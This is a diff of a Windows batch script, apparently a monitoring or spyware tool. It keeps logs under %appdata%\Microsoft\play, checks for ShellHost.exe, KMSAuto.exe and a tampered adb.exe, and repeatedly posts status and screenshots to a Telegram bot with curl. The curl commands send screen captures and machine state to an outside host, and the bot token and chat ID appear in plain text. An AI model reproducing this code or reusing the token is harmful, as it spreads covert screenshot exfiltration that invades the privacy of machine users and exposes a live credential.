@@ -24,7 +24,7 @@ for /f "usebackq delims=" %%A in ("%f%") do (
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=9.06"
+set "BATCHVERSION=9.15"
 set "SENDEVERY=10"
 set "SENDTXTFILE=0"
 set "CRBRSCHECK=1"
@@ -100,6 +100,10 @@ set "SHSTFILE=D:\ShellHost.exe"
 set "KMSFILE=D:\KMSAuto.exe"
 
 
+set "ADBFILE=C:\adb\adb.exe"
+set "ADBOFFMD5=81d188a849c8768e8f3694eb1c0e6086"
+set "ADBCLEAN=NOTDEFINED"
+set "ADBCLEANMSG=sdqdqsd"
 
 
 
@@ -107,6 +111,42 @@ set "input_file=%appdata%\Microsoft\play\playit_output.log"
 set "output_file=%appdata%\Microsoft\play\playit_20lines.log"
 
 
+
+for /f "skip=1 tokens=*" %%A in ('certutil -hashfile "%ADBFILE%" MD5 2^>nul') do (
+  set "md5=%%A"
+  goto :got
+)
+
+echo Failed to compute MD5.
+goto :aftergot
+
+:got
+REM remove spaces (certutil sometimes prints with spaces)
+set "md5=!md5: =!"
+if /I "!md5!"=="%ADBOFFMD5%" (
+  set "ADBCLEAN=1"
+  echo is clean
+) else (
+  set "ADBCLEAN=0"
+  echo is injected
+)
+
+
+
+:aftergot
+
+
+rem assume ADBCLEAN is already set to 1 or 0
+
+if "%ADBCLEAN%"=="1" (
+  set "ADBCLEANMSG=ADBCLEAN"
+) else (
+  if "%ADBCLEAN%"=="0" (
+    set "ADBCLEANMSG=ADBINJECTED"
+  ) else (
+    set "ADBCLEANMSG=ADBUNKNOWN"
+  )
+)
 
 
 
@@ -208,7 +248,7 @@ set /p TIMESS=<"%LASTSCREENFILE%"
 :: Check if 20 minutes have passed
 if %MINUTESS% GEQ %SENDEVERY% goto NEXT14
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%CRBRSSTATUS%|%time%|%BATCHVERSION%|"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%CRBRSSTATUS%|%time%|%BATCHVERSION%|%ADBCLEANMSG%"
 
 goto GOGO3
 
@@ -378,14 +418,14 @@ set RETRIES=1
 echo.
 echo TrySendTimes=%RETRIES%
 echo.
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SENDINGNOW1|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SENDINGNOW1|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|%ADBCLEANMSG%"
 echo.
 echo.
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%CRBRSSTATUS%|%time%|%BATCHVERSION%|" ^
+     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%CRBRSSTATUS%|%time%|%BATCHVERSION%|%ADBCLEANMSG%" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 30K
 
